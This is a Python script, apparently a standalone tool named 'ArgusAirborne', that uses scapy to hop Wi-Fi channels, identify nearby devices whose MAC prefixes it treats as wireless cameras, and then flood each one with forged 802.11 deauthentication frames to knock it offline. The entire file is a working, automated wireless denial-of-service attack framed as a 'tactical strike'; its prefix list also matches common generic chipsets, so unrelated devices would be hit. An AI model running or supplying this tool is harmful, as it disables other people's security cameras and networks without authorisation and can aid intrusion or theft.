import os
import sys
import time
import threading
from scapy.all import *

# Pre-defined MAC address prefixes for major wireless CCTV/Spy-cam chipsets (OUI lookup)
CAMERA_MAC_PREFIXES = ["24:0a:c4", "30:ae:a4", "bc:dd:c2", "a4:14:37", "00:1a:3f"]

class ArgusAirborne:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.detected_cameras = {} # Data structure: Target MAC -> AP BSSID
        self.sniffing = True

    def channel_hopper(self):
        """Hop between wireless channels dynamically to sweep the entire 2.4GHz spectrum"""
        channel = 1
        while self.sniffing:
            # Force the hardware interface to change its frequency channel
            os.system(f"iw dev {self.interface} set channel {channel}")
            channel = (channel % 13) + 1 # Cycle through channels 1-13
            time.sleep(0.5)

    def packet_handler(self, pkt):
        """Passive RF sniffing callback to identify target hardware signatures"""
        if pkt.haslayer(Dot11):
            src = pkt.addr2
            dst = pkt.addr1
            bssid = pkt.addr3

            if src and dst:
                prefix = src[:8].lower()
                if prefix in CAMERA_MAC_PREFIXES and src not in self.detected_cameras:
                    self.detected_cameras[src] = bssid
                    print(f"[+] COVERT CAMERA DETECTED: {src} | Associated BSSID: {bssid}")

    def scan_airspace(self, timeout=15):
        """Initiate non-disruptive channel monitoring sequence with active hopping"""
        print(f"[*] Activating Atheros wireless interface ({self.interface}) in monitor mode...")
        print("[*] Commencing automated spectrum scanning for spy-cam RF signals (No-Touch)...")
        
        # Start the channel hopping routine on a secondary thread
        hop_thread = threading.Thread(target=self.channel_hopper, daemon=True)
        hop_thread.start()
        
        # Sniff packets for a strictly bounded duration to maintain operational speed
        sniff(iface=self.interface, prn=self.packet_handler, timeout=timeout, store=0)
        
        # Terminate the hopping thread once sniffing time expires
        self.sniffing = False
        print(f"\n[!] Reconnaissance complete. Identified targets in perimeter: {len(self.detected_cameras)}")

    def deauth_attack(self, target_mac, bssid, duration=5):
        """Inject raw IEEE 802.11 management frames to isolate the target"""
        print(f"[*] Injecting electromagnetic deauth impulse to disconnect target: {target_mac}")
        
        # Force interface to lock onto the target's operating channel if known
        # (For simulation simplicity, assumes injection penetrates across active cell)
        pkt1 = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)/Dot11Deauth(reason=7)

        end_time = time.time() + duration
        while time.time() < end_time:
            sendp(pkt1, iface=self.interface, verbose=False)
            sendp(pkt2, iface=self.interface, verbose=False)
            time.sleep(0.1) # Maintain continuous injection density
            
        print(f"[+] Targeted isolation successful for device: {target_mac}")

    def execute_tactical_strike(self):
        # Scan airspace dynamically for 15 seconds
        self.scan_airspace(timeout=15)
        
        if not self.detected_cameras:
            print("[-] Zero wireless camera signatures captured in this sector.")
            return

        # Execute automated mass-disruption on all found targets sequentially
        for cam_mac, bssid in self.detected_cameras.items():
            if bssid:
                self.deauth_attack(cam_mac, bssid, duration=5)
                
        print("\n[!] RF INTERCEPT STAGE FINISHED: Handing over control to routing infrastructure.")

if __name__ == "__main__":
    # Fallback to wlan0 interface natively if no runtime argument is supplied
    iface = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
    
    commander = ArgusAirborne(iface)
    commander.execute_tactical_strike()